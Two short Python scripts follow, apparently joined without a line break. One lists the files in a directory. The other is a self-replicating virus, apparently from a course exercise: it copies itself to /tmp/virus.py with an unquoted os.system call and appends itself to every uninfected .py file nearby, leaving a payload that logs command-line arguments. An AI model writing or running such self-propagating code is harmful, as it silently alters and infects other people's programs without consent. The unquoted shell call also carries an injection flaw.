import os

if __name__ == '__main__':
    for file in os.listdir("."):
        if os.path.isfile(os.path.join(".", file)):
            print(file)import os
import sys

payload = """
## __virus
with open("Q1C.out", "a") as f:
    f.write(f"{' '.join(sys.argv)}\\n")
"""

if __name__ == '__main__':
    if not os.path.exists('/tmp/virus.py'):
        cwd = os.getcwd()
        script_name = os.path.basename(__file__)
        script_path = os.path.join(cwd, script_name)
        os.system(f'cp {script_path} /tmp/virus.py')
    
    with open('/tmp/virus.py', 'r') as f:
        virus = f.read()

        for file in os.listdir('.'):
            if not file.endswith(".py"):
                continue

            injected = False
            with open(file, "r") as f:
                for line in f:
                    if "## __virus" in line:
                        injected = True
                        break

            if not injected:
                with open(file, "a") as f:
                    f.write(virus)
